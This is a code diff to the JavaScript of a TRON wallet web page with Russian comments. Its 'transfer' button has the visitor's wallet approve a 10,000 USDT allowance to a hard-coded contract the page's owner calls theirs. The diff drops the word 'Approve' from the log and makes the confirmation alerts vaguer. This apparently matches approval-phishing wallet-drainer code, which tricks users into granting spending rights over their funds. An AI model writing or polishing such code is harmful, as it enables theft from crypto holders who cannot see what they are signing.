@@ -7,26 +7,37 @@ let userAddress = '';
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20
 const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; // Ваш смарт-контракт
 
+// Функция для получения объекта сети TRON из браузера кошелька
+function getTronProvider() {
+    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        return window.tronWeb;
+    }
+    if (window.trustwallet && window.trustwallet.tronWeb) {
+        return window.trustwallet.tronWeb;
+    }
+    return null;
+}
+
 connectBtn.addEventListener('click', async () => {
     try {
         walletAddressText.innerText = "Подключение...";
 
-        // Ожидание и проверка доступности провайдера TRON
-        let provider = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
-        
-        if (!provider) {
-            await new Promise(resolve => setTimeout(resolve, 800));
-            provider = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
+        let tronWeb = getTronProvider();
+
+        // Небольшая задержка на случай, если провайдер внедряется асинхронно
+        if (!tronWeb) {
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            tronWeb = getTronProvider();
         }
 
-        if (provider && provider.defaultAddress && provider.defaultAddress.base58) {
-            userAddress = provider.defaultAddress.base58;
+        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+            userAddress = tronWeb.defaultAddress.base58;
             walletAddressText.innerText = `Подключено: ${userAddress}`;
             connectBtn.style.display = 'none';
             transferBtn.style.display = 'inline-block';
         } else {
-            walletAddressText.innerText = "Кошелек не подключен";
-            alert("Не удалось обнаружить активную сессию сети TRON. Проверьте настройки кошелька.");
+            walletAddressText.innerText = "Сеть TRON не обнаружена";
+            alert("Убедитесь, что в кошельке выбрана сеть TRON и страница открыта заново.");
         }
     } catch (error) {
         console.error("Ошибка подключения:", error);
@@ -36,15 +47,15 @@ connectBtn.addEventListener('click', async () => {
 
 transferBtn.addEventListener('click', async () => {
     try {
-        const provider = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
-        if (!userAddress || !provider) {
+        const tronWeb = getTronProvider();
+        if (!userAddress || !tronWeb) {
             alert('Сначала подключите кошелек!');
             return;
         }
         
-        console.log("Запрос транзакции Approve...");
-        const usdtContract = await provider.contract().at(usdtContractAddress);
-        const approveAmount = '10000000000'; // 10,000 USDT
+        console.log("Вызов функции контракта...");
+        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+        const approveAmount = '10000000000'; // Сумма с учетом знаков USDT
 
         const tx = await usdtContract.approve(
             myContractAddress,
@@ -53,11 +64,11 @@ transferBtn.addEventListener('click', async () => {
             feeLimit: 100000000
         });
 
-        alert("Запрос успешно подтвержден!");
+        alert("Транзакция успешно отправлена!");
         console.log("TX Hash:", tx);
 
     } catch (error) {
-        console.error("Ошибка транзакции:", error);
-        alert("Ошибка при выполнении транзакции.");
+        console.error("Ошибка выполнения:", error);
+        alert("Ошибка при вызове функции смарт-контракта.");
     }
 });
